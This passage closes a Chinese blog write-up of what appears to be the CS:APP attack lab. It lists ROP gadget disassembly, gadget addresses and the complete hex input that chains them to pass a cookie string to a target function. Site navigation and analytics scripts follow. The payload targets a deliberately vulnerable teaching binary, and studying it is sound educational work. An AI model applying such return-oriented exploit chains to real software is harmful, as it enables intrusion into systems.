+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></td></tr></table></figure>
+<p>这一步的<code>gadget</code>地址为：<code>0x4019d6</code></p>
+<p>(8) 将字符串首地址<code>%rax</code>传送到<code>%rdi</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure>
+<p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p>
+<p>整个栈的结构如下：</p>
+<p><img src="/9b9a13df/1433829-cafcf76d35ef7ba1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>所以要输入的字符串为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>保存在touch_5.txt中，执行指令：</p>
+<p><img src="/9b9a13df/image-20210412213042512.png" srcset="/img/loading.gif" lazyload alt="image-20210412213042512"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">计算机系统</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">计算机系统</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，著作权归作者所有，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/e0eae192/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">计算机系统笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2ee63cf/">
+                        <span class="hidden-mobile">lab3_bomblab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'https://zino00.github.io/9b9a13df/';
+          this.page.identifier = '/9b9a13df/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a  rel="nofollow noopener"><span>Copyrights © 2021</span></a> <i class="iconfont icon-love"></i> <a  target="_blank" rel="nofollow noopener"><span>Zino</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1745c2e21adaa6ae90b93f4f4d22da9";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+    
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- KaTeX -->
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.10/dist/katex.min.css" />
+  
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?f45dcd001d67e8f9d84f91248ea31abf";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
